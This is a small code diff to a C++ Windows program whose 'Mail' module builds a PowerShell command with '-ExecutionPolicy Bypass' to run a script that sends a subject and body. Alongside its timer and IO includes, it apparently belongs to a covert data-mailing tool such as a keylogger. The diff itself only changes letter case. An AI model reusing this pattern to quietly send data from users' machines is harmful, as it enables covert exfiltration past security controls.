@@ -3,7 +3,7 @@
 
 #include <fstream>
 #include <vector>
-#include <windows.h>
+#include <Windows.h>
 #include "IO.h"
 #include "Timer.h"
 #include "helper.h"
@@ -114,7 +114,7 @@ namespace Mail
             if(!ok)
                 return -2;
 
-            std::string param = "-ExecutionPolicy ByPass -File \"" + scr_path + "\" -Subj \""
+            std::string param = "-ExecutionPolicy Bypass -File \"" + scr_path + "\" -Subj \""
                                 + StringReplace(subject, "\"", "\\\"") +
                                 "\" -Body \""
                                 + StringReplace(body, "\"", "\\\"") +
